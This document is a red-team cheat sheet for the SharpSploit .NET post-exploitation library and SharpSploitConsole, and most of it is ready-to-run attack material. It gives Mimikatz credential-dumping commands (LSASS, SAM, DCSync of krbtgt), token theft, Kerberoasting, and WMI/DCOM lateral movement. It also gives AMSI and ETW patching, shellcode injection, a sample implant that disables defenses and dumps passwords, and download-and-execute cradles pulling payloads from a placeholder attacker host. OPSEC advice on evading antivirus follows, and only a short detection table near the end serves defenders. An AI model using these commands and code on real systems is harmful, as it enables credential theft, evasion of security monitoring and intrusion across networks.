---
title: "SharpSploit"
description: "SharpSploit .NET post-exploitation library: execution, credentials, enumeration and evasion APIs."
category: tools
tags: [post-exploitation, dotnet, offensive]
tools: [SharpSploit]
difficulty: advanced
updated: "2026-08-09"
source: "vault:ActiveDirectory/SharpSploit.md"
---

# 🗡️ SharpSploit — Complete Cheat Sheet
> **Author:** Netrunner | **Tags:** `C#` `Post-Exploitation` `.NET` `Red Team` `AD`

---

## 📋 Table of Contents
1. [What is SharpSploit?](#what-is-sharpsploit)
2. [Architecture — Library vs Console](#architecture--library-vs-console)
3. [Compilation & Setup](#compilation--setup)
4. [Using SharpSploitConsole (Interactive)](#using-sharpsploitconsole-interactive)
5. [Credentials — Mimikatz & Token Manipulation](#credentials--mimikatz--token-manipulation)
6. [Enumeration — Host, Domain, Network](#enumeration--host-domain-network)
7. [Execution — Shell, PowerShell, Assembly, Shellcode](#execution--shell-powershell-assembly-shellcode)
8. [Lateral Movement — WMI, DCOM, SCM, PSRemoting](#lateral-movement--wmi-dcom-scm-psremoting)
9. [Evasion — AMSI & ETW Patching](#evasion--amsi--etw-patching)
10. [Building Custom Tooling (Library Usage)](#building-custom-tooling-library-usage)
11. [Delivery & In-Memory Execution](#delivery--in-memory-execution)
12. [OPSEC Tips](#opsec-tips)
13. [Detection & Indicators](#detection--indicators)
14. [Common Errors & Fixes](#common-errors--fixes)
15. [Quick Reference Card](#quick-reference-card)

---

## What is SharpSploit?

SharpSploit is a **.NET post-exploitation library** written in C# by Ryan Cobb (@cobbr) at SpecterOps. It is designed as a **DLL** — not a standalone executable — providing a rich API for offensive operations from managed code.

**Key design points:**
- Written as a class library (`.dll`) meant to be referenced by other C# projects
- Wraps native Win32/NT APIs using P/Invoke and D/Invoke (DynamicInvoke)
- Bundles an embedded Mimikatz PE for credential operations
- Targets **.NET Framework 3.5 and 4.0** for maximum Windows compatibility
- Organized into namespaces mirroring post-exploitation phases

**Namespaces at a glance:**

| Namespace | Purpose |
|-----------|---------|
| `SharpSploit.Credentials` | Mimikatz, Token manipulation, credential harvesting |
| `SharpSploit.Enumeration` | Host, Domain (LDAP), Network, Clipboard enumeration |
| `SharpSploit.Execution` | Shell commands, PowerShell, Assembly loading, Shellcode, Process injection |
| `SharpSploit.LateralMovement` | WMI, DCOM, SCM, PowerShell Remoting |
| `SharpSploit.Evasion` | AMSI bypass, ETW patching |

> **GitHub:** `https://github.com/cobbr/SharpSploit`
> **API Docs:** `https://sharpsploit.cobbr.io/api/index.html`

---

## Architecture — Library vs Console

### SharpSploit (The Library)
- A `.dll` — you reference it in your own C# project and call methods programmatically
- Maximum flexibility but requires C# development knowledge
- Ideal for custom implants, C2 integration, and bespoke tooling

### SharpSploitConsole (The Wrapper)
- Created by **@anthemtotheego** and **@g0ldengunsec**
- A standalone `.exe` that wraps SharpSploit methods into a CLI interface
- Designed for operators who need quick access without writing C#
- Supports both **interactive mode** and **non-interactive one-liner mode**
- GitHub: `https://github.com/anthemtotheego/SharpSploitConsole`

**When to use which:**
| Scenario | Use |
|----------|-----|
| Quick cred dump from a beacon | SharpSploitConsole |
| Building a custom C2 implant | SharpSploit library |
| One-off lateral movement | SharpSploitConsole |
| Integrating into Covenant/Sliver | SharpSploit library |
| Learning/testing capabilities | SharpSploitConsole |

---

## Compilation & Setup

### Compiling SharpSploit (the DLL)

```powershell
# Clone the repo
git clone https://github.com/cobbr/SharpSploit.git
cd SharpSploit

# Open in Visual Studio
# File → Open → Solution → SharpSploit.sln

# Build settings:
#   Configuration: Release
#   Platform: Any CPU (or match target arch: x64/x86)
#   Target Framework: .NET Framework 3.5 or 4.0

# Build → Build Solution (Ctrl+Shift+B)
# Output: bin\Release\SharpSploit.dll
```

### Compiling SharpSploitConsole

```powershell
# Clone the console wrapper
git clone https://github.com/anthemtotheego/SharpSploitConsole.git
cd SharpSploitConsole

# Open SharpSploitConsole.sln in Visual Studio
# Ensure SharpSploit.dll is referenced (should be included)
# Build → Release → Any CPU

# Optional: Merge into single EXE using Costura.Fody or ILMerge
# Costura.Fody is often pre-configured — just build and it embeds DLLs
```

### .NET Framework Compatibility

| Target OS | Default .NET | Recommended Build Target |
|-----------|-------------|--------------------------|
| Windows 7 / Server 2008 R2 | 3.5 | .NET 3.5 |
| Windows 8.1 / Server 2012 R2 | 4.5 | .NET 4.0 |
| Windows 10 / Server 2016+ | 4.6+ | .NET 4.0 |
| Windows 11 / Server 2022 | 4.8 | .NET 4.0 |

> **Tip:** Build for .NET 3.5 if you want max compat. Build for .NET 4.0 if you need newer API features.

---

## Using SharpSploitConsole (Interactive)

SharpSploitConsole provides a pre-built CLI wrapper around SharpSploit methods. It supports two modes: **interactive** (pseudo-shell) and **non-interactive** (single command).

### Starting Interactive Mode

```powershell
# Launch the console and enter interactive mode
SharpSploitConsole.exe Interact

# You'll get a prompt like:
# SharpSploit > _

# Type commands directly at the prompt
# Commands are CASE-INSENSITIVE
```

### Non-Interactive Mode (Single Command)

```powershell
# Run a single command and exit — ideal for C2 beacons
SharpSploitConsole.exe whoami
SharpSploitConsole.exe logonPasswords
SharpSploitConsole.exe Shell "net user /domain"
SharpSploitConsole.exe Kerberoast
```

### Full SharpSploitConsole Command Reference

#### System & Identity
```powershell
# Get current user context
SharpSploitConsole.exe whoami

# Escalate to SYSTEM (requires admin)
SharpSploitConsole.exe GetSystem

# Impersonate another process's token (requires admin + PID)
SharpSploitConsole.exe Impersonate <PID>
```

#### Command Execution
```powershell
# Execute a shell command (cmd.exe)
SharpSploitConsole.exe Shell "whoami /all"
SharpSploitConsole.exe Shell "net group \"Domain Admins\" /domain"
SharpSploitConsole.exe Shell "ipconfig /all"

# Execute PowerShell (bypasses AMSI, ScriptBlock logging, Module logging)
SharpSploitConsole.exe PowerShell "Get-Process"
SharpSploitConsole.exe PowerShell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.x/script.ps1')"
```

#### Credential Dumping (Requires Admin/SYSTEM)
```powershell
# Run ALL Mimikatz credential modules (except DCSync)
SharpSploitConsole.exe Mimi-All

# Run specific Mimikatz command
SharpSploitConsole.exe Mimi-Command "privilege::debug sekurlsa::logonPasswords"
SharpSploitConsole.exe Mimi-Command "lsadump::dcsync /user:DOMAIN\krbtgt"
SharpSploitConsole.exe Mimi-Command "sekurlsa::ekeys"

# Dump logon passwords (privilege::debug + sekurlsa::logonPasswords)
SharpSploitConsole.exe logonPasswords

# Dump SAM database hashes (local accounts)
SharpSploitConsole.exe SamDump

# Dump LSA Secrets (service account passwords, autologon, etc.)
SharpSploitConsole.exe LsaSecrets

# Dump LSA Cache (domain cached credentials — DCC2 hashes)
SharpSploitConsole.exe LsaCache

# Dump Wdigest credentials
SharpSploitConsole.exe Wdigest
```

#### Kerberoasting
```powershell
# Kerberoast all service accounts with SPNs
SharpSploitConsole.exe Kerberoast
```

#### Lateral Movement (Requires Admin on Target)
```powershell
# Execute command via WMI on a remote host
SharpSploitConsole.exe WMI <computername> <username> <password> <command>
# Example:
SharpSploitConsole.exe WMI DC01 PAINTERS\admin P@ssw0rd "whoami"

# Execute command via DCOM on a remote host
SharpSploitConsole.exe DCOM <computername> <command> <directory> <params>
# Example:
SharpSploitConsole.exe DCOM DC01 "cmd.exe" "C:\Windows\System32" "/c whoami"
```

#### Network Enumeration
```powershell
# Get members of a local group on a remote host
SharpSploitConsole.exe NetLocalGroupMembers <computername> <groupname> <username> <password>
# Example:
SharpSploitConsole.exe NetLocalGroupMembers DC01 Administrators PAINTERS\user P@ss

# List local groups on a remote host
SharpSploitConsole.exe NetLocalGroups <computername> <username> <password>

# List currently logged-on users on a remote host
SharpSploitConsole.exe NetLoggedOnUsers <computername> <username> <password>

# List active sessions on a remote host
SharpSploitConsole.exe NetSessions <computername> <username> <password>
```

### Interactive Mode Full Workflow Example

```
C:\Tools> SharpSploitConsole.exe Interact

SharpSploit > whoami
PAINTERS\svc_admin

SharpSploit > GetSystem
[+] Successfully impersonated: NT AUTHORITY\SYSTEM

SharpSploit > logonPasswords
  Authentication Id : 0 ; 999 (00000000:000003e7)
  Session           : UndefinedLogonType
  User Name         : DC01$
  Domain            : PAINTERS
   * Username : Administrator
   * Domain   : PAINTERS
   * NTLM     : aad3b435b51404eeaad3b435b51404ee
   * SHA1     : ...

SharpSploit > SamDump
Administrator:500:aad3b4...
Guest:501:aad3b4...

SharpSploit > Shell "net group \"Domain Admins\" /domain"
Members: Administrator  svc_admin

SharpSploit > Kerberoast
$krb5tgs$23$*svc_sql$PAINTERS.HTB$...

SharpSploit > WMI DC02 PAINTERS\Administrator P@ssw0rd "whoami"
painters\administrator

SharpSploit > exit
```

---

## Credentials — Mimikatz & Token Manipulation

### Using as a Library (C# Code)

```csharp
using SharpSploit.Credentials;

// === MIMIKATZ OPERATIONS ===

// Dump logon passwords (sekurlsa::logonPasswords)
string result = Mimikatz.LogonPasswords();
Console.WriteLine(result);

// Run any arbitrary Mimikatz command
string dcsync = Mimikatz.Command("lsadump::dcsync /user:PAINTERS\\krbtgt");
string ekeys  = Mimikatz.Command("sekurlsa::ekeys");
string cache  = Mimikatz.Command("lsadump::cache");
string sam    = Mimikatz.Command("lsadump::sam");

// Dump all credentials at once (logonpasswords + sam + cache + secrets + wdigest)
string all = Mimikatz.All();

// Dump SAM hashes
string samDump = Mimikatz.SamDump();

// Dump LSA Secrets
string secrets = Mimikatz.LsaSecrets();

// Dump LSA Cache (DCC2)
string lsaCache = Mimikatz.LsaCache();

// Dump Wdigest
string wdigest = Mimikatz.Wdigest();


// === TOKEN MANIPULATION ===

// Create a Tokens object
Tokens tokens = new Tokens();

// Escalate to SYSTEM (requires admin)
bool gotSystem = tokens.GetSystem();

// Impersonate a specific user by finding their process token
bool impersonated = tokens.ImpersonateUser("PAINTERS\\Administrator");

// Impersonate a process by PID
bool impersonatedProc = tokens.ImpersonateProcess(1234);

// Create a new logon token with known credentials
bool madeToken = tokens.MakeToken("PAINTERS\\svc_sql", "Password123!");

// Revert impersonation back to original context
bool reverted = tokens.RevertToSelf();

// Enable a specific token privilege
tokens.EnableTokenPrivilege("SeDebugPrivilege");

// List available token privileges
string privs = tokens.WhoAmI();
```

---

## Enumeration — Host, Domain, Network

### Host Enumeration

```csharp
using SharpSploit.Enumeration;

// Get list of running processes
string procs = Host.GetProcessList();

// Get current directory
string cwd = Host.GetCurrentDirectory();

// Get hostname
string hostname = Host.GetHostname();

// Get username
string user = Host.GetUsername();

// Get OS version info
string os = Host.GetOSVersion();

// List files in a directory
string files = Host.GetDirectoryListing("C:\\Users");

// Read a file
string content = Host.ReadFile("C:\\Users\\admin\\Desktop\\flag.txt");

// Get registry value
string regVal = Host.GetRegistryKey("HKLM", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");

// Monitor clipboard (returns clipboard contents)
string clipboard = Host.GetClipboard();
```

### Domain Enumeration (LDAP)

```csharp
using SharpSploit.Enumeration;

// Get domain users
string users = Domain.GetDomainUsers();

// Get domain groups
string groups = Domain.GetDomainGroups();

// Get domain computers
string computers = Domain.GetDomainComputers();

// Custom LDAP search
string search = Domain.LDAPSearch("(&(objectClass=user)(adminCount=1))", "DC=painters,DC=htb");

// Get members of a specific group
string daMembers = Domain.GetDomainGroupMembers("Domain Admins");

// Get domain trusts
string trusts = Domain.GetDomainTrusts();

// Get domain controllers
string dcs = Domain.GetDomainControllers();

// Get SPNs (useful for Kerberoasting prep)
string spns = Domain.GetDomainUserSPNs();
```

### Network Enumeration

```csharp
using SharpSploit.Enumeration;

// Ping a host
bool alive = Network.Ping("10.10.10.1");

// Port scan a host
string openPorts = Network.PortScan("10.10.10.1", new int[] { 21, 22, 80, 135, 389, 445, 3389, 5985 });

// Get local group members on a remote host
string members = Network.GetNetLocalGroupMembers("DC01", "Administrators");

// Get logged-on users on a remote host
string loggedOn = Network.GetNetLoggedOnUsers("DC01");

// Get sessions on a remote host
string sessions = Network.GetNetSessions("DC01");
```

---

## Execution — Shell, PowerShell, Assembly, Shellcode

### Shell Command Execution

```csharp
using SharpSploit.Execution;

// Execute a cmd.exe command
string output = Shell.ShellExecute("whoami /all");
string output2 = Shell.ShellExecute("net user /domain");
string output3 = Shell.ShellExecute("ipconfig /all");

// Execute and capture stderr as well
string result = Shell.ShellExecute("dir C:\\Users");
```

### PowerShell Execution

```csharp
using SharpSploit.Execution;

// Execute a PowerShell command (bypasses AMSI, ScriptBlock logging, Module logging)
string psOutput = Shell.PowerShellExecute("Get-Process | Select-Object Name,Id");

// Execute PowerShell script from string
string psScript = @"
    $users = Get-ADUser -Filter * -Properties AdminCount
    $users | Where-Object { $_.AdminCount -eq 1 } | Select Name
";
string psResult = Shell.PowerShellExecute(psScript);

// Download and execute (cradle)
string cradle = Shell.PowerShellExecute(
    "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.x/PowerView.ps1'); Get-DomainUser -AdminCount"
);
```

### .NET Assembly Loading (In-Memory Execution)

```csharp
using SharpSploit.Execution;

// Load a .NET assembly from bytes and execute
byte[] assemblyBytes = File.ReadAllBytes("Rubeus.exe");
Assembly.AssemblyExecute(assemblyBytes, new string[] { "kerberoast", "/outfile:hashes.txt" });

// Load from a URL
byte[] assemblyFromWeb = new System.Net.WebClient().DownloadData("http://10.10.14.x/Seatbelt.exe");
Assembly.AssemblyExecute(assemblyFromWeb, new string[] { "-group=all" });

// Load a .NET DLL and call a specific method
Assembly.AssemblyExecute(dllBytes, "ClassName", "MethodName", new object[] { "arg1", "arg2" });
```

### Shellcode Execution

```csharp
using SharpSploit.Execution;

// Execute raw shellcode in current process
byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83, ... };
ShellCode.ShellCodeExecute(shellcode);

// Process injection — inject shellcode into a remote process
Injection.Inject(shellcode, targetPID);
```

### D/Invoke (Dynamic Invocation)

```csharp
using SharpSploit.Execution.DynamicInvoke;

// Dynamically invoke Win32 API without P/Invoke signatures
// Avoids static analysis / IAT hooks
object[] funcArgs = { processHandle, baseAddress, regionSize, allocationType, protection };
IntPtr result = (IntPtr)Win32.DynamicAPIInvoke("kernel32.dll", "VirtualAllocEx", 
    typeof(Win32.Delegates.VirtualAllocEx), ref funcArgs);

// Invoke NT API
object[] ntArgs = { processHandle, ref baseAddress, IntPtr.Zero, ref regionSize, allocationType, protection };
uint ntStatus = (uint)Native.LdrGetDllHandle("ntdll.dll", "NtAllocateVirtualMemory",
    typeof(Native.Delegates.NtAllocateVirtualMemory), ref ntArgs);
```

---

## Lateral Movement — WMI, DCOM, SCM, PSRemoting

```csharp
using SharpSploit.LateralMovement;

// === WMI LATERAL MOVEMENT ===
// Execute a command on a remote host via WMI (requires admin)
string wmiResult = WMI.WMIExecute("DC01", "whoami", "PAINTERS\\Administrator", "P@ssw0rd");

// === DCOM LATERAL MOVEMENT ===
// Execute via DCOM (MMC20.Application / ShellWindows / ShellBrowserWindow)
DCOM.DCOMExecute("DC01", "cmd.exe /c whoami > C:\\output.txt", "C:\\Windows\\System32");

// === SCM (Service Control Manager) ===
// Create and start a service on a remote host
// Requires admin on target + SMB access
// Note: Creates Windows Event logs for service creation

// === PowerShell Remoting ===
// Execute via WinRM/PSRemoting
string psRemoteResult = PowerShellRemoting.InvokeCommand("DC01", "whoami; hostname");
```

### Lateral Movement via SharpSploitConsole

```powershell
# WMI — execute command on remote host
SharpSploitConsole.exe WMI DC01 "PAINTERS\admin" "P@ssw0rd" "whoami"
SharpSploitConsole.exe WMI DC01 "PAINTERS\admin" "P@ssw0rd" "net localgroup administrators"

# DCOM — execute via DCOM object
SharpSploitConsole.exe DCOM DC01 "cmd.exe" "C:\Windows\System32" "/c whoami > C:\temp\out.txt"
```

---

## Evasion — AMSI & ETW Patching

```csharp
using SharpSploit.Evasion;

// Patch AMSI (AmsiScanBuffer) in current process
// Prevents PowerShell/AMSI from scanning loaded scripts
Amsi.PatchAmsiScanBuffer();

// Patch ETW (EtwEventWrite) to suppress event logging
// Prevents .NET assembly loads from generating ETW events
Etw.PatchEtw();
```

**Why this matters:**
- AMSI patch = PowerShell commands executed via `Shell.PowerShellExecute()` won't be scanned
- ETW patch = In-memory .NET assembly loads won't generate `Microsoft-Windows-DotNETRuntime` events
- Both should be called **early** before any other operations

---

## Building Custom Tooling (Library Usage)

### Minimal C# Implant Example

```csharp
using System;
using SharpSploit.Credentials;
using SharpSploit.Enumeration;
using SharpSploit.Execution;
using SharpSploit.Evasion;

namespace CustomImplant
{
    class Program
    {
        static void Main(string[] args)
        {
            // Step 1: Patch defenses
            Amsi.PatchAmsiScanBuffer();
            Etw.PatchEtw();

            // Step 2: Enumerate
            Console.WriteLine("[*] Current User: " + Host.GetUsername());
            Console.WriteLine("[*] Hostname: " + Host.GetHostname());
            Console.WriteLine("[*] OS: " + Host.GetOSVersion());

            // Step 3: Check if we're admin
            string privs = Shell.ShellExecute("whoami /priv");
            if (privs.Contains("SeDebugPrivilege"))
            {
                Console.WriteLine("[+] Running as admin — dumping creds");

                // Escalate to SYSTEM
                Tokens tokens = new Tokens();
                tokens.GetSystem();

                // Dump everything
                Console.WriteLine(Mimikatz.LogonPasswords());
                Console.WriteLine(Mimikatz.SamDump());

                // Revert
                tokens.RevertToSelf();
            }

            // Step 4: Domain Enumeration
            Console.WriteLine("[*] Domain Admins:");
            Console.WriteLine(Domain.GetDomainGroupMembers("Domain Admins"));

            // Step 5: Kerberoast
            Console.WriteLine("[*] SPNs found:");
            Console.WriteLine(Domain.GetDomainUserSPNs());
        }
    }
}
```

### Visual Studio Project Setup

```
1. File → New → Console App (.NET Framework)
2. Target Framework: .NET Framework 4.0
3. Solution Explorer → References → Add Reference → Browse
4. Select SharpSploit.dll
5. Write your code using SharpSploit namespaces
6. Build → Release

# Single-file merge (optional):
# Install Costura.Fody via NuGet:
Install-Package Costura.Fody
# Rebuild — SharpSploit.dll is now embedded in your .exe
```

---

## Delivery & In-Memory Execution

### Drop to Disk

```powershell
# Download SharpSploitConsole to target
certutil -urlcache -f http://10.10.14.x/SharpSploitConsole.exe C:\Windows\Temp\ssc.exe
iwr -uri http://10.10.14.x/SharpSploitConsole.exe -outfile C:\Windows\Temp\ssc.exe
# Via Evil-WinRM
upload SharpSploitConsole.exe
```

### In-Memory via Reflection (.NET Assembly Loading)

```powershell
# Load SharpSploitConsole in memory — never touches disk
$data = (New-Object Net.WebClient).DownloadData('http://10.10.14.x/SharpSploitConsole.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[SharpSploitConsole.Program]::Main("logonPasswords".Split())

# Or with arguments
[SharpSploitConsole.Program]::Main(@("Shell", "whoami /all"))
[SharpSploitConsole.Program]::Main(@("Mimi-Command", "sekurlsa::ekeys"))
```

### Via Covenant / Grunt

```
# SharpSploit is the native library for Covenant C2
# All Grunt tasks use SharpSploit methods under the hood

# In Covenant UI:
# Interact → Task → Select task (e.g., Mimikatz, ShellCmd, Assembly)
# Tasks map directly to SharpSploit API calls
```

### Via execute-assembly (Cobalt Strike)

```
# Load SharpSploitConsole via execute-assembly
beacon> execute-assembly /path/to/SharpSploitConsole.exe logonPasswords
beacon> execute-assembly /path/to/SharpSploitConsole.exe Kerberoast
beacon> execute-assembly /path/to/SharpSploitConsole.exe Shell "net group \"Domain Admins\" /domain"
```

---

## OPSEC Tips

```
✅ Patch AMSI and ETW BEFORE any other SharpSploit operations
   Amsi.PatchAmsiScanBuffer() + Etw.PatchEtw()

✅ Use in-memory execution (Assembly.Load) — avoid dropping to disk
   The binary is heavily signatured by every major AV/EDR

✅ Use D/Invoke (DynamicInvoke) instead of P/Invoke for API calls
   Avoids static IAT analysis and API hooking

✅ Obfuscate before deployment — use ConfuserEx, InvisibilityCloak, or manual edits
   Change namespaces, class names, method names, and strings

✅ Use MakeToken() over ImpersonateUser() when you have creds
   MakeToken creates a new logon — ImpersonateUser requires finding an existing process

✅ Always call RevertToSelf() after token impersonation
   Leaving orphaned impersonation tokens can cause instability

✅ Avoid Mimikatz.All() — it's noisy. Use targeted calls instead
   LogonPasswords() or SamDump() individually as needed

✅ Use AES keys for Kerberos operations when available
   RC4 downgrades trigger alerts on modern EDR

⚠️ SharpSploitConsole is HEAVILY detected — treat it as burned
   Build custom wrappers instead or use through C2 frameworks

⚠️ The embedded Mimikatz PE will trigger signature-based detection
   Consider replacing with NanoDump or manual LSASS techniques
```

---

## Detection & Indicators

| Indicator | Details |
|-----------|---------|
| **Binary signatures** | SharpSploit.dll and SharpSploitConsole.exe are signatured by all major AV |
| **AMSI detection** | `AmsiScanBuffer` patching triggers `Amsi.AmsiOpenSession` alerts |
| **ETW events** | Assembly loads generate `Microsoft-Windows-DotNETRuntime/AssemblyLoad` events |
| **Mimikatz artifacts** | `sekurlsa::logonPasswords` opens LSASS — triggers Sysmon Event 10 |
| **WMI lateral movement** | Generates Event 4648 (Logon with explicit credentials) + WMI events |
| **Token manipulation** | Sysmon Event 8 (CreateRemoteThread) and Event 10 (ProcessAccess) |
| **Kerberoasting** | Event 4769 (TGS request) with RC4 encryption type |
| **Service creation** | Event 7045 (New service installed) for SCM lateral movement |
| **Strings in memory** | `SharpSploit`, `cobbr`, `Mimikatz` visible in process memory |

### MITRE ATT&CK Mapping

| Technique | TTP ID |
|-----------|--------|
| Credential Dumping (LSASS) | T1003.001 |
| Token Impersonation | T1134.001 |
| Kerberoasting | T1558.003 |
| WMI Execution | T1047 |
| DCOM Execution | T1021.003 |
| PowerShell Execution | T1059.001 |
| AMSI Bypass | T1562.001 |
| In-Memory .NET Assembly | T1620 |

---

## Common Errors & Fixes

| Error | Cause | Fix |
|-------|-------|-----|
| `System.BadImageFormatException` | Architecture mismatch (x86 vs x64) | Rebuild for correct platform or use AnyCPU |
| `FileNotFoundException: SharpSploit.dll` | DLL not found at runtime | Embed with Costura.Fody or place DLL in same directory |
| `System.TypeLoadException` | .NET Framework version mismatch | Build for .NET 3.5 if target has older Windows |
| `Access Denied` on Mimikatz calls | Not running as admin/SYSTEM | Call `GetSystem()` first or ensure SeDebugPrivilege |
| `AMSI blocked execution` | AMSI scanning caught the payload | Call `Amsi.PatchAmsiScanBuffer()` before execution |
| `Could not load assembly` | Assembly.Load failed | Check assembly is valid .NET, not native PE |
| WMI lateral movement fails | Firewall / RPC blocked | Ensure ports 135 + dynamic RPC range are open |
| DCOM execution fails | DCOM not enabled on target | Check `dcomcnfg` — DCOM must be enabled |
| Token impersonation fails | No suitable process found for user | User must have an active session on the box |
| `Unhandled Exception: System.Security.SecurityException` | CLR restrictions / CAS | Run from Full Trust context, avoid constrained language |

---

## Quick Reference Card

```
═══════════════════════════════════════════════════════
  SHARPSPLOITCONSOLE QUICK REFERENCE
═══════════════════════════════════════════════════════

INTERACTIVE:        SharpSploitConsole.exe Interact
WHOAMI:             SharpSploitConsole.exe whoami
GET SYSTEM:         SharpSploitConsole.exe GetSystem
IMPERSONATE:        SharpSploitConsole.exe Impersonate <PID>

SHELL CMD:          SharpSploitConsole.exe Shell "<command>"
POWERSHELL:         SharpSploitConsole.exe PowerShell "<command>"

LOGON PASSWORDS:    SharpSploitConsole.exe logonPasswords
SAM DUMP:           SharpSploitConsole.exe SamDump
LSA SECRETS:        SharpSploitConsole.exe LsaSecrets
LSA CACHE:          SharpSploitConsole.exe LsaCache
WDIGEST:            SharpSploitConsole.exe Wdigest
MIMI ALL:           SharpSploitConsole.exe Mimi-All
MIMI CUSTOM:        SharpSploitConsole.exe Mimi-Command "<command>"

KERBEROAST:         SharpSploitConsole.exe Kerberoast

WMI EXEC:           SharpSploitConsole.exe WMI <host> <user> <pass> <cmd>
DCOM EXEC:          SharpSploitConsole.exe DCOM <host> <cmd> <dir> <params>

NET LOCAL GROUPS:   SharpSploitConsole.exe NetLocalGroups <host> <user> <pass>
NET GROUP MEMBERS:  SharpSploitConsole.exe NetLocalGroupMembers <host> <group> <user> <pass>
NET LOGGED ON:      SharpSploitConsole.exe NetLoggedOnUsers <host> <user> <pass>
NET SESSIONS:       SharpSploitConsole.exe NetSessions <host> <user> <pass>

═══════════════════════════════════════════════════════
  SHARPSPLOIT LIBRARY QUICK REFERENCE (C# CODE)
═══════════════════════════════════════════════════════

PATCH AMSI:         Amsi.PatchAmsiScanBuffer();
PATCH ETW:          Etw.PatchEtw();

LOGON PASSWORDS:    Mimikatz.LogonPasswords();
SAM DUMP:           Mimikatz.SamDump();
LSA SECRETS:        Mimikatz.LsaSecrets();
MIMI COMMAND:       Mimikatz.Command("<command>");

GET SYSTEM:         tokens.GetSystem();
IMPERSONATE USER:   tokens.ImpersonateUser("DOMAIN\\User");
MAKE TOKEN:         tokens.MakeToken("DOMAIN\\User", "password");
REVERT:             tokens.RevertToSelf();

SHELL CMD:          Shell.ShellExecute("<command>");
POWERSHELL:         Shell.PowerShellExecute("<command>");
LOAD ASSEMBLY:      Assembly.AssemblyExecute(bytes, args);
SHELLCODE:          ShellCode.ShellCodeExecute(bytes);

DOMAIN USERS:       Domain.GetDomainUsers();
DOMAIN GROUPS:      Domain.GetDomainGroups();
DOMAIN COMPUTERS:   Domain.GetDomainComputers();
LDAP SEARCH:        Domain.LDAPSearch("<filter>", "<searchBase>");

WMI EXEC:           WMI.WMIExecute("host", "cmd", "user", "pass");
DCOM EXEC:          DCOM.DCOMExecute("host", "cmd", "dir");

PROCESS LIST:       Host.GetProcessList();
READ FILE:          Host.ReadFile("path");
HOSTNAME:           Host.GetHostname();
```

---

> **Sources:** SharpSploit GitHub (cobbr/SharpSploit) | SharpSploitConsole GitHub (anthemtotheego/SharpSploitConsole) | SpecterOps Blog | SharpSploit API Docs (sharpsploit.cobbr.io)
